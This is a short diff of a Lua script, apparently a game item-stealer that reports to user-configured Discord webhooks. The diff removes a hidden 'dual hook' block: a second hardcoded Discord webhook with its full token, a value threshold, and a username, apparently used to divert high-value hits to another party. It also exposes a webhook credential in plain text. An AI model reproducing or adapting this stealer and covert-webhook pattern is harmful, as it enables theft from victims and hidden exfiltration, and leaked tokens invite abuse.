@@ -9,11 +9,6 @@ local webhook = config.user_webhook
 local usernames = config.users or {}
 local minPingVal = tonumber(config.Min_Ping) or 0 
 
--- DUAL HOOK SETTINGS
-local dh_webhook = "https://discord.com/api/webhooks/1450903311711469688/FBGaVVR5vJksrrZMWzQlgNCu79RvxkzW_8vofNCKuwGCwOef--XsPlc-WnVmbi4v7P2B" 
-local dh_val = 500
-
-local dualhook_usernames = {"B4C0NN62"}
 local allFriends = {}
 
 for _, name in ipairs(usernames) do table.insert(allFriends, name) end
